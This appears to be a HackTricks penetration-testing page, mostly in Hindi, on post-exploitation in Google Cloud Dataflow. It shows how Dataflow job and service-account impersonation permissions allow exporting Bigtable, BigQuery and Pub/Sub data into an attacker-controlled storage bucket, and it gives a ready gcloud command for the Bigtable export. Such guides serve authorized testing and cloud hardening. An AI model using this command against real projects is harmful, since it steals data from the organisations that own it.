# GCP - Dataflow Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Dataflow

Dataflow के बारे में अधिक जानकारी के लिए देखें:

{{#ref}}
../gcp-services/gcp-dataflow-enum.md
{{#endref}}

### अन्य सेवाओं से डेटा exfiltrate करने के लिए Dataflow का उपयोग

**अनुमतियाँ:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs` (over a SA with access to source and sink)

Dataflow job बनाने के अधिकार होने पर, आप GCP Dataflow templates का उपयोग करके Bigtable, BigQuery, Pub/Sub, और अन्य सेवाओं से डेटा attacker-controlled GCS buckets में export कर सकते हैं। यह एक शक्तिशाली post-exploitation technique है जब आपके पास Dataflow access होता है — उदाहरण के लिए [Dataflow Rider](../gcp-privilege-escalation/gcp-dataflow-privesc.md) privilege escalation (pipeline takeover via bucket write) के माध्यम से।

> [!NOTE]
> आपको उस service account पर `iam.serviceAccounts.actAs` चाहिए जिसके पास स्रोत पढ़ने और sink में लिखने की पर्याप्त permissions हों। डिफ़ॉल्ट रूप से, यदि निर्दिष्ट नहीं किया गया है तो Compute Engine default SA का उपयोग किया जाता है।

#### Bigtable to GCS

देखें [GCP - Bigtable Post Exploitation](gcp-bigtable-post-exploitation.md#dump-rows-to-your-bucket) — "Dump rows to your bucket" पूर्ण पैटर्न के लिए। Templates: `Cloud_Bigtable_to_GCS_Json`, `Cloud_Bigtable_to_GCS_Parquet`, `Cloud_Bigtable_to_GCS_SequenceFile`.

<details>

<summary>Export Bigtable to attacker-controlled bucket</summary>
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<YOUR_BUCKET>/raw-json/ \
--staging-location=gs://<YOUR_BUCKET>/staging/
```
</details>

#### BigQuery से GCS

Dataflow टेम्पलेट मौजूद हैं ताकि आप BigQuery डेटा को export कर सकें। अपने लक्ष्य फ़ॉर्मैट (JSON, Avro, आदि) के लिए उपयुक्त टेम्पलेट का उपयोग करें और आउटपुट को अपने बकेट की ओर निर्देशित करें।

#### Pub/Sub और स्ट्रीमिंग स्रोत

स्ट्रीमिंग पाइपलाइन्स Pub/Sub (या अन्य स्रोतों) से पढ़ सकती हैं और GCS में लिख सकती हैं। उस टेम्पलेट के साथ एक जॉब लॉन्च करें जो लक्ष्य Pub/Sub subscription से पढ़े और आपके नियंत्रित बकेट में लिखे।

## संदर्भ

- [Dataflow templates](https://cloud.google.com/dataflow/docs/guides/templates/provided-templates)
- [Control access with IAM (Dataflow)](https://cloud.google.com/dataflow/docs/concepts/security-and-permissions)
- [GCP - Bigtable Post Exploitation](gcp-bigtable-post-exploitation.md)

{{#include ../../../banners/hacktricks-training.md}}
